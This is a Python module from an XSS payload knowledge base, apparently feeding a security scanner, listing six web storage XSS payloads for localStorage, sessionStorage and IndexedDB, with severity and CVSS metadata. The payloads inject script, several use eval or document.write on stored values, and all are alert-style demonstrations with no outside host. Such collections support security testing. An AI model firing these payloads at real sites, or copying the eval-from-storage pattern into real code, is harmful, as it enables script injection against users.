#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Web Storage XSS Payloads
"""

from ..models import PayloadEntry


STORAGE_XSS_PAYLOADS = {
    "storage_1": PayloadEntry(
        payload="<script>localStorage.setItem('xss','<img src=x onerror=alert(1)>')</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Stored XSS in localStorage",
        tags=["storage", "localstorage", "stored"],
        reliability="high",
    ),
    "storage_2": PayloadEntry(
        payload="<script>sessionStorage.setItem('xss','<script>alert(1)<\\/script>')</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Stored XSS in sessionStorage",
        tags=["storage", "sessionstorage", "stored"],
        reliability="high",
    ),
    "storage_3": PayloadEntry(
        payload="<script>eval(localStorage.getItem('payload'))</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.5,
        description="Eval from localStorage",
        tags=["storage", "localstorage", "eval"],
        reliability="high",
    ),
    "storage_4": PayloadEntry(
        payload="<script>document.write(localStorage.getItem('content'))</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="document.write from localStorage",
        tags=["storage", "localstorage", "document-write"],
        reliability="high",
    ),
}

INDEXEDDB_PAYLOADS = {
    "idb_1": PayloadEntry(
        payload="<script>indexedDB.open('xss').onsuccess=e=>{let db=e.target.result;let tx=db.transaction('store','readwrite');tx.objectStore('store').put('<script>alert(1)<\\/script>','key')}</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Stored XSS in IndexedDB",
        tags=["indexeddb", "stored"],
        reliability="medium",
    ),
    "idb_2": PayloadEntry(
        payload="<script>indexedDB.open('db').onsuccess=e=>{let r=e.target.result.transaction('s').objectStore('s').get('x');r.onsuccess=()=>eval(r.result)}</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.5,
        description="Eval from IndexedDB",
        tags=["indexeddb", "eval"],
        reliability="medium",
    ),
}

# Combined database
STORAGE_DATABASE = {
    **STORAGE_XSS_PAYLOADS,
    **INDEXEDDB_PAYLOADS,
}
STORAGE_TOTAL = len(STORAGE_DATABASE)
